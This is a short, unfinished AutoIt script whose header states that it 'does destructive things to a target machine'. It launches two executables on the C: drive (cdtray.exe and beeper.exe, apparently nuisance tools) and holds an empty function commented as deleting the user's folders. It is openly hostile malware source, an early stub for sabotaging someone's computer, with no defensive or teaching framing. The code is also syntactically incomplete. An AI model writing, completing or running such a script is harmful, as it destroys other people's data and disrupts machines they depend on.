#cs ----------------------------------------------------------------------------
 AutoIt Version: 3.3.8.1
 Author:         biodrone
 Script Function:
	Does destructive things to a target machine
#ce ----------------------------------------------------------------------------

Global $Destruct = True

Func Main()
   Run_Exe()
   Fold_Del()
EndFunc
; run all of the destructive exe's
Func Run_Exe()
   If $Destruct = True Then ; run all other .exe files needed for complete destruction!
	  Run("C:\cdtray.exe")
	  Run("C:\beeper.exe")
   EndIf
EndFunc
; deletes the users folders
Func Fold_Del
   
EndFunc
